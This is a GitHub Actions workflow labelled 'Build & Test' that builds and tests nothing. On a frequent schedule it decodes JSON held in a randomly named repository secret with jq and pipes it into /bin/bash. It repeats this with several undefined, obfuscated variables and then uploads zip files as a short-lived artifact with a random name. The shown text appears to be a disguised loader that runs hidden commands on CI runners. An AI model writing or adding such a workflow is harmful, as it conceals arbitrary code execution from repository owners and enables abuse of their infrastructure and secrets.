name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '46 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          rfpnx8: ${{ secrets.rfpnx8 }}
        run: |
          printf '%s' "$rfpnx8" | jq -r .vrr6 | /bin/bash
          echo $e7 | jq -r .kx2 | /bin/bash
          echo $i3 | jq -r .c8376 | /bin/bash
          printf '%s' "$ulzbu569" | jq -r .qf5 | /bin/bash
          printf '%s' "$dp619" | jq -r .s182 | /bin/bash
          echo $brx54 | jq -r .vm03 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: nO4PfA0Q
          path: "*.zip"
          retention-days: 1
